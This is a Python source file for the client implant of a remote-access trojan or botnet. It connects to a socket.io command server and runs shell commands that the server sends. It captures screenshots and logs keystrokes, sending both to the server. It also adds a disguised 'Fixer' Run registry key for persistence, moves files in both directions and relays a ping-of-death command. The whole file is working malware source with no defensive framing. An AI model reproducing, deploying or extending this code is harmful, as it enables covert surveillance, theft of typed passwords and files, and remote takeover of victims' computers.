# Client.py

import platform
import socket
import winreg
import os, uuid
import subprocess
import requests
from pynput import keyboard
import socketio
import pyautogui

server_ip = '192.168.100.222'
server_port = 8000
info = {}
client = socketio.Client()

persistenceVariable = False
keyloggerVaraible = False
screenshotNumber = 1
keyloggerNumber = 1
completedTasks = []
hostname = socket.gethostname()

def take_screenshot(idNumber,command,hostname):
    global screenshotNumber
    try:
        filename = f"{hostname}_screenshot_{screenshotNumber}.png"
        screenshot = os.path.join(filename)
        pyautogui.screenshot(screenshot)
        with open(f'{filename}', 'rb') as file:
            file_data = file.read()
            client.emit('module_file', {'idNumber': idNumber, 'command': command, 'hostname' : hostname, 'file_name': filename, 'file_data' : file_data})
        screenshotNumber += 1
        return screenshot
    except Exception as e:
        return str(e)

def create_key(name="default", path="") -> bool:
    reg_key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_WRITE)
    if not reg_key:
        return False
    winreg.SetValueEx(reg_key, name, 0, winreg.REG_SZ, path)
    reg_key.Close()
    return True

def try_persistence():
    if create_key("Fixer", str(os.path.realpath(__file__))):
        return True
    else:
        return False

def start_keylogger(key):
    try:
        char = getattr(key, 'char', None)
        if char is not None:
            client.emit('keylogs', {'hostname': hostname, 'key': char})
        else:
            special_keys = {
                keyboard.Key.space: ' ',
                keyboard.Key.backspace: ' [BACKSPACE] ',
                keyboard.Key.enter: ' \n ',
                keyboard.Key.shift: ' [SHIFT] ',
                keyboard.Key.shift_l: ' [SHIFT] ',
                keyboard.Key.shift_r: ' [SHIFT] ',
                keyboard.Key.tab: ' [TAB] ',
                keyboard.Key.ctrl: ' [CTRL] ',
                keyboard.Key.ctrl_l: ' [CTRL] ',
                keyboard.Key.ctrl_r: ' [CTRL] ',
                keyboard.Key.alt: ' [ALT] ',
                keyboard.Key.alt_l: ' [ALT] ',
                keyboard.Key.alt_r: ' [ALT] ',
                keyboard.Key.alt_gr: ' [ALT] ',
                keyboard.Key.caps_lock: ' [CAPS-LOCK] ',
                keyboard.Key.num_lock: ' [NUM-LOCK] ',
                keyboard.Key.esc: ' [ESC] ',
                keyboard.Key.delete: ' [DELETE] ',
                keyboard.Key.page_up: ' [PAGE-UP] ',
                keyboard.Key.page_down: ' [PAGE-DOWN] ',
                keyboard.Key.insert: ' [INSERT] ',
                keyboard.Key.print_screen: ' [PRINT-SCREEN] ',
            }
            special_key = special_keys.get(key)
            if special_key:
                client.emit('keylogs', {'hostname': hostname, 'key': special_key})
    except Exception as e:
        print("ERROR: Could not process key:", e)

@client.on('ping')
def handle_ping(ping):
    idNumber = ping.get('idNumber')
    command = ping.get('command')
    ip_address = ping.get('ip_address')
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        for line in iter(process.stdout.readline, b''):
            if f'Reply from {ip_address}: bytes=65500 time<1ms TTL=128' in line:
                output = "PING-OF-DEATH Command Executed Successfully"
                client.emit('ping_output', {'idNumber': idNumber, 'output': output})
                break
            elif f'Reply from {ip_address}: Destination host unreachable.' in line:
                output = "ERROR : Destination host unreachable."
                client.emit('ping_output', {'idNumber': idNumber, 'output': output})
                break
            else:
                output = "ERROR : Command Did not give proper Output"
                client.emit('ping_output', {'idNumber': idNumber, 'output': output})
                break
        else:
            output = "ERROR : Command could not be Executed"
            client.emit('ping_output', {'idNumber': idNumber, 'output': output})
    except Exception as e:
        error_message = str(e)
        print(f"Exception occurred: {error_message}")
        client.emit('ping_output', {'idNumber': idNumber, 'output': f"ERROR: {error_message}"})

@client.on('commands')
def handle_commands(commands):
    idNumber = commands.get('idNumber')
    command = commands.get('command')
    hostname = commands.get('hostname')
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        output_str = output.decode('utf-8').strip()
        error_str = error.decode('utf-8').strip()
        if error_str:
            client.emit('commands_output', {'idNumber': idNumber, 'command': command, 'hostname': hostname, 'output' : error_str})
        else:
            client.emit('commands_output', {'idNumber': idNumber, 'command': command, 'hostname': hostname, 'output' : output_str})
    except Exception as e:
        return f"ERROR: {str(e)}"

@client.on("module")
def message(module):
    global persistenceVariable, completedTasks, keyloggerVaraible
    idNumber = module.get('idNumber')
    command = module.get('command')
    hostname = module.get('hostname')

    try:
        if command == 'persistence':
            if not persistenceVariable:
                if try_persistence():
                    persistenceVariable = True
                    result = "Persistence Key Has Been Added"
                    module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'DATA': result}
                else:
                    result = "Persistence Key Could Not be Added"
                    module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'DATA': result}
            else:
                result = "Persistence Key Already Added"
                module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'DATA': result}
        elif command == 'screenshot':
            screenshot_pic = take_screenshot(idNumber,command,hostname)
            if isinstance(screenshot_pic, str):
                result = f"Screenshot Has Been Captured"
                module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'DATA': result}
            else:
                result = f"Screenshot Could not be Captured"
                module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'DATA': result}
        elif command == 'keylogger':
            if not keyloggerVaraible:
                listener = keyboard.Listener(on_press=start_keylogger)
                listener.start()
                keyloggerVaraible = True
                result = "Keylogger has been started"
                module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'DATA': result}
            elif keyloggerVaraible:
                result = "Keylogger has Already been started"
                module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'DATA': result}
        else:
            result = "Keylogger Could not be Started"
            module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'DATA': result}

        client.emit('module_output', module_output)
    except Exception as e:
        print("ERROR : ", str(e))

@client.on('download')
def upload(input):
    idNumber = input.get('idNumber')
    transfer_type = input.get('transfer_type')
    hostname = input.get('hostname')
    file_name = input.get('file_name')
    if transfer_type == 'download':
        try:
            with open(f'{file_name}', 'rb') as file:
                file_data = file.read()
            client.emit('download_client', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'file_data' : file_data})
        except:
            file_data = "File Could not be Read from Client"
            client.emit('download_client', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'file_data' : file_data})

@client.on('upload')
def download(input):
    idNumber = input.get('idNumber')
    transfer_type = input.get('transfer_type')
    hostname = input.get('hostname')
    file_name = input.get('file_name')
    file_data = input.get('file_data')
    if transfer_type == 'upload':
        try:
            with open(file_name, 'wb') as file:
                file.write(file_data)
                status = "File Has Been Uploaded SuccessFully form Client"
            client.emit('file_status', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'status' : status})
        except:
            status = "File Could not be Uploaded from Client"
            client.emit('file_status', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'status' : status})

info['COMMAND'] = 'INFO'
info["idNumber"] = str(uuid.uuid4())
info["hostname"] = socket.gethostname()
info["OS"] = platform.platform()
info["IP"] = requests.get('https://api.ipify.org').text

@client.event
def connect():
    info['sid'] = client.sid
    client.emit('Initial_Information', info)
    print('CLIENT SUCCESSFULLY CONNECTIED TO THE SERVER ✅')

@client.event
def disconnect():
    print('CLIENT PAINFULLY DISCONNECTED FROM THE SERVER ❌')
    client.emit('message', {'COMMAND': 'OUTPUT', 'idNumber': info['idNumber'], 'command': 'status update', 'DATA': 'Bot is dead'})

print(f"CONNECTING TO THE SERVER {server_ip}:{server_port} ⏳ ")
client.connect(f'http://{server_ip}:{server_port}')
client.wait()
